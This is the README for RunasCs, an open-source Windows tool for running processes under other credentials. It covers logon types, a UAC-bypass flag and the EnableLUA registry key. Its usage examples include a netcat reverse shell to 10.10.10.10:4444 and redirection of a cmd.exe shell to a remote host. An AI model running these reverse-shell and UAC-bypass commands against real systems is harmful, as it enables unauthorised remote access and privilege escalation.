### RunasCs

----

*RunasCs* is an utility to run specific processes with different permissions than the user's current logon provides using explicit credentials.
This tool is an improved and open version of windows builtin *runas.exe* that solves some limitations:

* Allows explicit credentials
* Works both if spawned from interactive process and from service process
* Manage properly *DACL* for *Window Stations* and *Desktop* for the creation of the new process
* Uses more reliable create process functions like ``CreateProcessAsUser()`` and ``CreateProcessWithTokenW()`` if the calling process holds the required privileges (automatic detection)
* Allows to specify the logon type, e.g. 8-NetworkCleartext logon (no *UAC* limitations)
* Allows to bypass UAC when an administrator password is known (flag --bypass-uac)
* Allows to create a process with the main thread impersonating the requested user (flag --remote-impersonation)
* Allows redirecting *stdin*, *stdout* and *stderr* to a remote host
* It's Open Source :)

*RunasCs* has an automatic detection to determine the best create process function for every contexts.
Based on the process caller token permissions, it will use one of the create process function in the following preferred order:

1. ``CreateProcessAsUserW()``
2. ``CreateProcessWithTokenW()``
3. ``CreateProcessWithLogonW()``


### Requirements

----

.NET Framework >= 2.0


### Usage

----

```console
RunasCs v1.5 - @splinter_code

Usage:
    RunasCs.exe username password cmd [-d domain] [-f create_process_function] [-l logon_type] [-r host:port] [-t process_timeout] [--force-profile] [--bypass-uac] [--remote-impersonation]

Description:
    RunasCs is an utility to run specific processes under a different user account
    by specifying explicit credentials. In contrast to the default runas.exe command
    it supports different logon types and CreateProcess* functions to be used, depending
    on your current permissions. Furthermore it allows input/output redirection (even
    to remote hosts) and you can specify the password directly on the command line.

Positional arguments:
    username                username of the user
    password                password of the user
    cmd                     commandline for the process

Optional arguments:
    -d, --domain domain
                            domain of the user, if in a domain.
                            Default: ""
    -f, --function create_process_function
                            CreateProcess function to use. When not specified
                            RunasCs determines an appropriate CreateProcess
                            function automatically according to your privileges.
                            0 - CreateProcessAsUserW
                            1 - CreateProcessWithTokenW
                            2 - CreateProcessWithLogonW
    -l, --logon-type logon_type
                            the logon type for the token of the new process.
                            Default: "2" - Interactive
    -t, --timeout process_timeout
                            the waiting time (in ms) for the created process.
                            This will halt RunasCs until the spawned process
                            ends and sent the output back to the caller.
                            If you set 0 no output will be retrieved and a
                            background process will be created.
                            Default: "120000"
    -r, --remote host:port
                            redirect stdin, stdout and stderr to a remote host.
                            Using this option sets the process_timeout to 0.
    -p, --force-profile
                            force the creation of the user profile on the machine.
                            This will ensure the process will have the
                            environment variables correctly set.
                            WARNING: If non-existent, it creates the user profile
                            directory in the C:\Users folder.
    -b, --bypass-uac
                            try a UAC bypass to spawn a process without
                            token limitations (not filtered).
    -i, --remote-impersonation
                            spawn a new process and assign the token of the
                            logged on user to the main thread.

Examples:
    Run a command as a local user
        RunasCs.exe user1 password1 "cmd /c whoami /all"
    Run a command as a domain user and logon type as NetworkCleartext (8)
        RunasCs.exe user1 password1 "cmd /c whoami /all" -d domain -l 8
    Run a background process as a local user,
        RunasCs.exe user1 password1 "C:\tmp\nc.exe 10.10.10.10 4444 -e cmd.exe" -t 0
    Redirect stdin, stdout and stderr of the specified command to a remote host
        RunasCs.exe user1 password1 cmd.exe -r 10.10.10.10:4444
    Run a command simulating the /netonly flag of runas.exe
        RunasCs.exe user1 password1 "cmd /c whoami /all" -l 9
    Run a command as an Administrator bypassing UAC
        RunasCs.exe adm1 password1 "cmd /c whoami /priv" --bypass-uac
    Run a command as an Administrator through remote impersonation
        RunasCs.exe adm1 password1 "cmd /c echo admin > C:\Windows\admin" -l 8 --remote-impersonation
```

The two processes (calling and called) will communicate through one *pipe* (both for *stdout* and *stderr*).
The default logon type is 2 (*Interactive*). 

By default, the *Interactive* (2) logon type is restricted by *UAC* and the generated token from these authentications are filtered.
You can make interactive logon without any restrictions by setting the following regkey to 0 and restart the server:

```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA
```

Otherwise, you can try the flag **--bypass-uac** for an attempt in bypassing the token filtering limitation.

**NetworkCleartext (8)** logon type is the one with the widest permissions as it doesn't get filtered by UAC in local tokens and still allows
 authentications over the Network as it stores credentials in the authentication package. If you holds enough privileges, try to always specify this logon type through the flag --logon-type 8.

By default, the calling process (*RunasCs*) will wait until the end of the execution of the spawned process. 
If you need to spawn a background or async process, i.e. spawning a reverse shell, you need to set the parameter ``-t timeout`` to ``0``. In this case *RunasCs* won't wait for the end of the newly spawned process execution.

### References

----

* [Potatoes and tokens](https://decoder.cloud/2018/01/13/potato-and-tokens/)
* [Starting an Interactive Client Process in C++](https://docs.microsoft.com/en-us/previous-versions/aa379608(v=vs.85))
* [Creating a Child Process with Redirected Input and Output](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
* [Interactive Services](https://learn.microsoft.com/en-us/windows/win32/services/interactive-services)
* [What is up with "The application failed to initialize properly (0xc0000142)" error?](https://blogs.msdn.microsoft.com/winsdk/2015/06/03/what-is-up-with-the-application-failed-to-initialize-properly-0xc0000142-error/)
* [Getting an Interactive Service Account Shell](https://www.tiraniddo.dev/2020/02/getting-interactive-service-account.html)
* [Reading Your Way Around UAC (Part 1)](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-1.html)
* [Reading Your Way Around UAC (Part 2)](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-2.html)
* [Reading Your Way Around UAC (Part 3)](https://www.tiraniddo.dev/2017/05/reading-your-way-around-uac-part-3.html)
* [Vanara - A set of .NET libraries for Windows implementing PInvoke calls to many native Windows APIs with supporting wrappers](https://github.com/dahall/Vanara)

### Credits

-----

* [@decoder](https://github.com/decoder-it)
* [@qtc-de](https://github.com/qtc-de)
* [@winlogon0](https://twitter.com/winlogon0)
